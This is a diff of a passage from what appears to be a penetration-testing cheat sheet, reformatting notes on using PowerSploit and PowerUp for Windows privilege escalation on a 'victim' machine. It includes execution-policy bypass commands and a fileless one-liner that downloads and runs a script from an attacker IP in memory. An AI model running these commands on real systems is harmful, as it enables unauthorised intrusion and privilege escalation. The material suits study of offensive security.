@@ -1489,29 +1489,33 @@ http://www.r00tsec.com/2011/09/exploiting-microsoft-iis-version-60.html
 -   Powershell Priv Escalation Tools
     https://github.com/PowerShellMafia/PowerSploit
     
-    Download to victim, unzip
-    `echo $Env:PSModulePath` - to see where to locate folder
-    `mkdir C:\Users\username\Documents\WindowsPowerShell\Modules` - create this folder with
-    Copy PowerSploit and Privesc folder to "C:\Users\username\Documents\WindowsPowerShell\Modules"  
-    `powershell.exe -nop -exec bypass` 
-    cd to PowerSploit folder
-    `Import-Module PowerSploit` -  To use the module, type  Import-Module .\PowerSploit.psd1
-    `Import-Module Privesc` Import-Module PowerUp.ps1
-    `Get-Command -Module PowerSploit` - To see the commands imported, type 
-    `Get-Help Out-Minidump` - To get help  on some command
+      Download to victim, unzip
+          
+          `echo $Env:PSModulePath` - to see where to locate folder
+          `mkdir C:\Users\username\Documents\WindowsPowerShell\Modules` - create this folder with
+          
+      Copy PowerSploit and Privesc folder to "C:\Users\username\Documents\WindowsPowerShell\Modules"  
+          
+          `powershell.exe -nop -exec bypass` 
+      cd to PowerSploit folder
+         
+         `Import-Module PowerSploit` -  To use the module, type  Import-Module .\PowerSploit.psd1
+          `Import-Module Privesc` Import-Module PowerUp.ps1
+          `Get-Command -Module PowerSploit` - To see the commands imported, type 
+          `Get-Help Out-Minidump` - To get help  on some command
     
-    `Invoke-AllChecks -HTMLReport`  
+          `Invoke-AllChecks -HTMLReport`  
     
-    Non-Interractive shells:
-    One option is to upload the PowerUp.ps1 script to the machine, drop into a shell, and execute the following command:
-    C:\> `powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}”`
+      Non-Interractive shells:
+      One option is to upload the PowerUp.ps1 script to the machine, drop into a shell, and execute the following command:
+          
+          `powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}”`
        
 
-    TO invoke everything without touching disk
-
-      C:\Users\lowpriv>`powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.11.0.183/PowerSploit/Privesc/PowerUp.ps1');Get-ServiceUnquoted"`
+      TO invoke everything without touching disk
+         
+         C:\Users\lowpriv>`powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.11.0.183/PowerSploit/Privesc/PowerUp.ps1');Get-ServiceUnquoted"`
    
-        
     
 
 -   Windows Run As - Switching users in linux is trival with the `SU` command.  However, an equivalent command does not exist in Windows.  Here are 3 ways to run a command as a different user in Windows.
